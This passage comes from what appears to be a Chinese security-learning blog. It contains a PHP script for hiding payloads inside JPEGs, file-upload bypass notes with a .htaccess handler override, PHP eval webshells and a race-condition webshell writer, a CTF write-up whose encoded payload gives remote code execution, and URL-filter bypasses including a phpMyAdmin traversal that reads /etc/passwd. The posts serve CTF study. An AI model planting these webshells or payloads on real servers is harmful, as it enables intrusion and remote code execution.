(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() == <span class="hljs-number">0xFF</span>)) &#123;<br>           <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>();<br>           <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readShort</span>() - <span class="hljs-number">2</span>;<br>           <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">skip</span>(<span class="hljs-variable">$size</span>);<br>           <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>               <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>();<br>               <span class="hljs-variable">$outStreamTmp</span> = <br>                   <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                   <span class="hljs-variable">$miniPayload</span> . <br>                   <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                   <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>               <span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>               <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                   <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>())) &#123;<br>                       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">readByte</span>() === <span class="hljs-number">0xFF</span>) &#123;<br>                           <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                               <span class="hljs-keyword">break</span>;<br>                           &#125;<br>                       &#125;<br>                   &#125;<br>                   <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;<span class="hljs-title function_ invoke__">seek</span>() - <span class="hljs-number">2</span>;<br>                   <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                   <span class="hljs-variable">$outStream</span> = <br>                       <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                       <span class="hljs-variable">$miniPayload</span> . <br>                       <span class="hljs-title function_ invoke__">substr</span>(<br>                           <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                               <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                           <span class="hljs-number">0</span>,<br>                           <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                               <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>               &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                   <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-keyword">break</span>;<br>               &#125;<br>               <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkImage</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                   <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-keyword">break</span>;<br>               &#125;<br>           &#125;<br>       &#125;<br>   &#125;<br>   <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>   <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>       <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>       <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>       <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>       <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$filename</span>);<br>       <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>           <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>       <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>       <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>       <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>           <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>               <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>           &#125;<br>       &#125;<br>   &#125;<br><br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>       <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>       <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>       <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>           <span class="hljs-variable language_">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>               <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) || !<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$filename</span>))<br>                   <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>               <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>           &#125;<br>           <span class="hljs-variable language_">$this</span>-&gt;size = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData);<br>       &#125;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;size - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData));<br>       &#125;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>       &#125;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">eof</span>()) &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>           &#125;<br>           <span class="hljs-variable">$byte</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>           <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>           <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$byte</span>);<br>       &#125;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>           &#125;<br>           <span class="hljs-variable">$short</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>           <span class="hljs-variable language_">$this</span>-&gt;binData = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>           <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;order) &#123;<br>               <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-variable">$short</span> = (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>           &#125;<br>           <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>       &#125;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">return</span> !<span class="hljs-variable language_">$this</span>-&gt;binData||(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>       &#125;<br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>具体看代码逻辑</p><p>  move_uploaded_file和rename_file不允许\x00, 不能采用00截断的方法<br>  必须是一个有效路径， a.php.也不行了 （可能与php版本有关）<br>  但是a.php&#x2F;.可以，并保存为a.php</p></li></ul><h3 id="2-MIME类型检测"><a href="#2-MIME类型检测" class="headerlink" title="2. MIME类型检测"></a>2. MIME类型检测</h3><pre><code class="hljs">直接在burpsuite里面改</code></pre><h3 id="3-文件头检测"><a href="#3-文件头检测" class="headerlink" title="3. 文件头检测"></a>3. 文件头检测</h3><pre><code class="hljs">加上GIF89A (会使得.htaccess失效)</code></pre><h3 id="4-配置文件覆盖"><a href="#4-配置文件覆盖" class="headerlink" title="4. 配置文件覆盖"></a>4. 配置文件覆盖</h3><pre><code class="hljs">上传.ini文件或者.htaccess文件。</code></pre><p><strong>.htaccess文件不要有 GIF89A ！！！</strong><br><strong>不然会报语法错误500！！</strong><br>解决方法： 用注释符(#,\x00)并自定义宽高</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs .htaccess">#define width 1<br>#define height 1<br>&lt;FilesMatch &quot;1.jpg&quot;&gt;  <br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>可以绕过getimagesize和exif_imagetype</p><h3 id="5-文件内容过滤"><a href="#5-文件内容过滤" class="headerlink" title="5. 文件内容过滤"></a>5. 文件内容过滤</h3><p>a. 过滤&lt;?   –&gt;   script 绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-title function_ invoke__">phpinfo</span>();<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>b. 有时还会碰到这种奇葩条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;uploaded&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &lt; <span class="hljs-number">2048</span><br></code></pre></td></tr></table></figure><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ol><li>白名单</li><li>先传到服务器再删除</li><li>文件上传路径已知<br><strong>payload</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;cmd.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一手发包，一手访问上传的文件<br>如果上传的文件还没被删除，就被访问到，那么这段代码就会生成一个cmd.php，从而访问cmd.php得到webshell</p>]]></content>
    
    
    <categories>
      
      <category>文件上传</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>无数字字母RCE</title>
    <link href="/blogs/RCE/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/"/>
    <url>/blogs/RCE/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/</url>
    
    <content type="html"><![CDATA[<h2 id="题目-RCE-ME"><a href="#题目-RCE-ME" class="headerlink" title="题目: RCE ME"></a>题目: <a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]RCE%20ME">RCE ME</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/Br&gt;&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>).<span class="hljs-string">&quot;&lt;/Br&gt;&quot;</span>;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ol><li>字符串取反绕过</li><li>字符串异或(同上)</li></ol><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?code<span class="hljs-operator">=</span>(~<span class="hljs-variable">%9</span>E<span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>C<span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>D<span class="hljs-variable">%8</span>B)(~<span class="hljs-variable">%9</span>A<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%DB</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%CE</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%D6</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>第一个字符括号内的结果是<code>assert</code>,<br>第二个括号内结果是<code>eval($_POST[1])</code></p><p>执行顺序是</p><ol><li>解析变量 得到 <code>assert</code> 和 <code>eval($_POST[1])</code></li><li>调用eval,解析变量</li><li>调用assert,执行代码</li></ol><h2 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h2><ol><li><p>为什么不能直接构造<code>$_POST[1]</code>,而要加上<code>assert(eval(..))</code>?</p><p> <strong>A:</strong><br> 直接构造<code>$_POST[1]</code>,执行的是</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$_POST[1]&#x27;</span>);<br></code></pre></td></tr></table></figure><p> 作用仅限于解析了POST变量1<br> 而不是所期望执行的</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p> 先取得变量,再执行代码.</p></li><li><p>为什么不能直接构造<code>eval($_POST[1])</code>?<br> <strong>A:</strong><br> 如果可以使用字母,直接传递<code>?code=eval($_POST[1]);</code>,可以达到效果,第一层eval获取了变量,第二层eval执行代码<br> 但是不能使用字母时,由于<strong>eval不是一个php函数,而是语言构造器,不能采用可变函数的方式调用</strong>,同样的,echo、include…也不行。详情见<a href="https://www.php.net/manual/zh/functions.variable-functions.php">php可变函数</a></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>RCE</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Rstudio避坑指北</title>
    <link href="/blogs/windows/rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/"/>
    <url>/blogs/windows/rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/</url>
    
    <content type="html"><![CDATA[<h2 id="R-is-not-appear-to-be-installed"><a href="#R-is-not-appear-to-be-installed" class="headerlink" title="R is not appear to be installed"></a>R is not appear to be installed</h2><p> –status 解决了但不知道为什么解决了..</p><p>把Rstudio和R放在D盘同一个父目录下，并配置好环境变量<br>执行Rstudio.exe却报错<code>R is not appear to be installed</code><br><img src="/blogs/windows/rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/Rstudio.png" alt="报错"></p><p>但是在无数次重装之后自动就消失了,甚至在我故意取消了环境变量之后,终端中已经无法识别<br><code>Rscript</code>之后,打开Rstudio仍然可以执行R代码,并且在Rstudio的终端中可以找到R的路径</p><p>可能利用了相对路径寻找,而不是用环境变量寻找 :(</p><h2 id="gpu-error"><a href="#gpu-error" class="headerlink" title="gpu error"></a>gpu error</h2><p>在解决了上述问题之后, Rstudio虽然不报错了,但是双击后一会就闪退了.<br>重装到C盘默认路径中即可解决.</p><p>但是为什么在D盘就不行呢?🤔</p><p>在D盘下终端执行报错<br><img src="/blogs/windows/rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/Rstudio_gpu.png" alt="gpu error"><br>拿报错信息上网搜了下, 虽然没有rstudio对应的结果,但是却在electron项目下找到了一摸一样的<a href="https://github.com/electron/electron/issues/37862">issue</a>, 而<code>Electron是一个使用 JavaScript、HTML 和 CSS 构建桌面应用程序的框架</code>,看来是electron项目的问题, 而用到electron的项目有很多, 在一篇解决selenium4报错gpu error的<a href="https://blog.csdn.net/liweiweili126/article/details/129417319">文章</a>中发现加上 <code>--no-sandbox</code> 选项之后, 即可正常执行</p><p>这个选项是对软件的安全限制, 默认开启, 禁止软件访问一些系统资源, 因此导致gpu error.<br>而在默认路径下,系统可能给了较高的信任度, 因此允许该位置下的软件访问资源, 所以在C盘中可以直接执行</p><p>想起来之前chrome只能下载在C盘, 手动移动到D盘之后再运行也是闪退<br>尝试加上参数<code>--no-sandbox</code>果然可以执行.<br><img src="/blogs/windows/rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/chrome_no_sandbox.png"><br>不过有警告.<br>恶意攻击者可能可以直接通过访问chrome访问系统中的重要资源</p><hr><p>2025.3.18</p><p>虽然在桌面快捷方式中添加执行参数很容易，但是当需要双击运行rstudio的时候就需要修改注册表了。</p><p>双击文件时，操作系统会根据文件后缀<code>(比如.rmd)</code>, 在注册表中查找<code>计算机\HKEY_CLASSES_ROOT\.rmd</code>, </p><p><img src="/blogs/windows/rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/%E6%A0%B9%E6%8D%AE%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B.png" alt="alt text"><br>然后操作系统就会把该文件识别为rmd_auto_file,并在路径<code>计算机\HKEY_CLASSES_ROOT\rmd_auto_file</code>中查找</p><p><img src="/blogs/windows/rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/1748491873791.png" alt="alt text"><br>右边的数据项就是资源管理器中显示的数据类型, 而shell&#x2F;open&#x2F;command下就是打开方式<br><img src="/blogs/windows/rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/%E6%B3%A8%E5%86%8C%E8%A1%A8_open_command.png"><br>添加上–no-sandbox参数即可</p><p>另外<code>计算机\HKEY_CLASSES_ROOT\.rmd</code>目录下有一个openWithList, 记录着右键打开方式,可以删除不想要的值<br>也有可能删除之后不起效果, 这时再到<code>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.rmd\OpenWithList</code>目录下看看</p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网页权限控制</title>
    <link href="/blogs/uncategorized/%E7%BD%91%E9%A1%B5%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/"/>
    <url>/blogs/uncategorized/%E7%BD%91%E9%A1%B5%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/593376086">文章</a></p><p>![[Pasted image 20250115115548.png]]</p><ol><li><p>通过 &#x2F;..&#x2F; 的方式访问<br> 适合于只对url的开头部分做判断的场景<br> 如: <code>if(uri.startsWith(&quot;/system/login&quot;)) &#123; return true&#125;</code> 或 <code>if(uri.startsWith(&quot;flag.php&quot;)) &#123; return false&#125;</code></p><p> 先访问一个肯定不被黑名单的文件<br> 然后用&#x2F;..&#x2F;回到上一个目录,再访问flag.php</p><p> payload:<a href="http://localhost/test/test.php?file=abadlfjaweoikljfladsfja/../flag.php">http://localhost/test/test.php?file=abadlfjaweoikljfladsfja/../flag.php</a></p><p> 白名单应用: <a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">phpmyadmin文件包含漏洞</a><br> 由于phpadmin只检查?前的文件是否在白名单内<br> <code>/phpmyadmin/index.php?target=db_sql.php?/../../../../../../../../../../etc/passwd</code><br> 可以通过将木马写入表格中后包含 .frm文件或者写入session文件并包含session文件<a href="https://blog.csdn.net/weixin_44037296/article/details/111039461">getshell</a></p></li><li><p>在目标页面后添加 “;bypass”<br> 适合于对url结尾部分做判断的场景<br>  如: uri.endsWith(“.do”)||uri.endsWith(“.action”)</p></li><li><p>在url后添加’&#x2F;‘<br> 不影响访问,即&#x2F;flag.html和&#x2F;flag.html&#x2F;是一样的</p></li><li><p>url编码绕过:<br> 当先过滤再url解码时有用<br> 可能需要多重url编码</p><p> 浏览器搜索框和burpsuite会自动对url进行解码一次，因此在这二者中需要多编码一次。</p></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>anaconda激活环境后无法执行命令</title>
    <link href="/blogs/windows/anaconda%E6%BF%80%E6%B4%BB%E7%8E%AF%E5%A2%83%E5%90%8E%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/"/>
    <url>/blogs/windows/anaconda%E6%BF%80%E6%B4%BB%E7%8E%AF%E5%A2%83%E5%90%8E%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>正常情况下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda <span class="hljs-built_in">env</span> list<br><br><span class="hljs-comment"># conda environments:</span><br><span class="hljs-comment">#</span><br>base                   E:\anaconda3<br></code></pre></td></tr></table></figure><p>……<br>……<br>……</p><p>某天激活环境后突然报错<br>&#x2F;System32&gt; conda activate base<br>&#x2F;System32&gt; conda env list<br>usage: conda-script.py [-h] [-v] [–no-plugins] [-V] COMMAND …<br>conda-script.py: error: argument COMMAND: invalid choice: ‘’ (choose from ‘activate’, ‘clean’, ‘commands’, ‘compare’, ‘config’, ‘create’, ‘deactivate’, ‘env’, ‘export’, ‘info’, ‘init’, ‘install’, ‘list’, ‘notices’, ‘package’, ‘build’, ‘content-trust’, ‘convert’, ‘debug’, ‘develop’, ‘doctor’, ‘index’, ‘inspect’, ‘metapackage’, ‘render’, ‘repoquery’, ‘skeleton’, ‘token’, ‘pack’, ‘server’, ‘repo’, ‘remove’, ‘uninstall’, ‘rename’, ‘run’, ‘search’, ‘update’, 